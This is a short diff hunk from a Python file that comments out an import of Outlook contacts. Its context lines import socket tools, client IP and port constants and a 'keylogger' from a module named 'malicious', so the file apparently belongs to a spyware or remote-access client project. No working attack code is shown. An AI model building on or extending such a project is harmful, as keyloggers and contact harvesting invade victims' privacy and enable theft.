@@ -8,7 +8,7 @@ import sys
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-from outlook.contacts import Contacts
+# from outlook.contacts import Contacts
 from server.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
 from malicious import keylogger
 from server.clnt.protocol import Protocol
